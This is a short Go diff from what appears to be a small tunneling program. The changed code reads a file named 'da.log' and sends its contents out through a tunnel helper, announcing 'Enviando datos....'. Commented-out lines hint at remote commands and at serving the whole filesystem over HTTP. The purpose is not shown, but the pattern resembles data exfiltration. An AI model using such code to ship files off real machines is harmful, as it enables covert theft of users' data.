@@ -13,17 +13,22 @@ func main(){
 	fmt.Println("ASJDLAJSLDJALKSDJLAKJSDLKASJDLKJALSDAKDLA")
 
 	
-	re := tunnel.InitTunne()
-	fmt.Println(re)
-	if(re){
-		data, err := os.ReadFile("da.log")
+	 re := tunnel.InitTunne()
+	 fmt.Println(re)
+	 if(re){
+	 	dat, err := os.ReadFile("da.log")
 		if(err != nil){
-			sendTools.Send("error")
-		}else{
-			sendTools.Send(string(data))
+			fmt.Println(err)
 		}
+		fmt.Println(string(dat))
+		sendTools.Send("Enviando datos....")
+		re := sendTools.Send(string(dat))
+		fmt.Println(re)
 		
-	}
+	 }else{
+		fmt.Println("Error")
+	 }
+	
 
 	//fmt.Println(tunnel.Command("linux", "hel"))
 	// resp := http.FileServer(http.Dir("/"))
